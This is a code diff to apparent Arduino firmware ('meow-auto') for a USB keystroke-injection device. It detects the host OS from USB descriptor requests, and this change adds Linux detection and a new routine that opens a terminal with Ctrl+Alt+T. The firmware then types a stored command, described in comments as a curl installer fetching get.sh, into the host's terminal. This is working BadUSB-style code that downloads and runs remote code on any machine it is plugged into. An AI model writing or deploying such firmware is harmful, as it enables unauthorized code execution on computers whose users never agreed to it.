@@ -25,13 +25,17 @@
 class OSDetect : public PluggableUSBModule {
 public:
     volatile bool windows = false;
+    volatile bool linux   = false;
     OSDetect() : PluggableUSBModule(0, 0, NULL) { PluggableUSB().plug(this); }
 protected:
     bool setup(USBSetup&) { return false; }
     int  getInterface(uint8_t*) { return 0; }
     int  getDescriptor(USBSetup& s) {
-        /* wValueH==3 -> STRING descriptor; index 0xEE -> MS OS String Descriptor */
+        /* Windows uniquely requests the MS OS String Descriptor (STRING 0xEE). */
         if (s.wValueH == 3 && s.wValueL == 0xEE) windows = true;
+        /* Linux probes the DEVICE_QUALIFIER descriptor (type 0x06); macOS never
+         * does (confirmed by capture). Checked after Windows, which wins. */
+        if (s.wValueH == 6) linux = true;
         return 0;   /* not handled -- let the core continue normally */
     }
 };
@@ -62,6 +66,14 @@ static void do_windows(void)
     run_line(WIN_CMD);                              /* installs; `exit` closes it */
 }
 
+static void do_linux(void)
+{
+    /* Ctrl+Alt+T opens a terminal on most Linux desktops (GNOME, XFCE, ...).
+     * Not universal across every DE, but the common default. */
+    combo3(KEY_LEFT_CTRL, KEY_LEFT_ALT, 't'); delay(1600);
+    run_line(NIX_CMD);   /* same curl installer; get.sh detects Linux by uname */
+}
+
 static void do_mac(void)
 {
     /* Launch macOS Terminal by LOCATION (Spotlight name-search collides with a
@@ -80,6 +92,14 @@ static void do_mac(void)
     combo(KEY_LEFT_GUI, 'w');
 }
 
+/* Windows wins over Linux wins over macOS (Windows may also probe 0x06). */
+static const __FlashStringHelper* detected_os(void)
+{
+    if (osdetect.windows) return F("WINDOWS");
+    if (osdetect.linux)   return F("LINUX");
+    return F("MAC/other");
+}
+
 void setup(void)
 {
     Serial.begin(115200);
@@ -87,25 +107,21 @@ void setup(void)
     delay(3000);           /* enumeration completes here; 0xEE seen if Windows */
 
 #ifdef MEOW_PROBE
-    /* Probe mode: report the live detection flag forever and NEVER install, so
-     * the 0xEE sniffer can be tested by sending an emulated Windows descriptor
-     * request over USB and watching the flag flip. */
-    for (;;) {
-        Serial.print(F("meow-auto OS="));
-        Serial.println(osdetect.windows ? F("WINDOWS") : F("MAC/other"));
-        delay(300);
-    }
+    /* Probe mode: report the live detection forever and NEVER install, so the
+     * sniffer can be tested by emulating each OS's descriptor request over USB
+     * and watching the flag change. */
+    for (;;) { Serial.print(F("meow-auto OS=")); Serial.println(detected_os()); delay(300); }
 #endif
 
     /* telemetry so the detection is verifiable over serial before it fires */
     for (uint8_t i = 0; i < 5; i++) {
-        Serial.print(F("meow-auto OS="));
-        Serial.println(osdetect.windows ? F("WINDOWS") : F("MAC/other"));
+        Serial.print(F("meow-auto OS=")); Serial.println(detected_os());
         delay(400);
     }
 
-    if (osdetect.windows) do_windows();
-    else                  do_mac();
+    if      (osdetect.windows) do_windows();
+    else if (osdetect.linux)   do_linux();
+    else                       do_mac();
 }
 
 void loop(void) { }
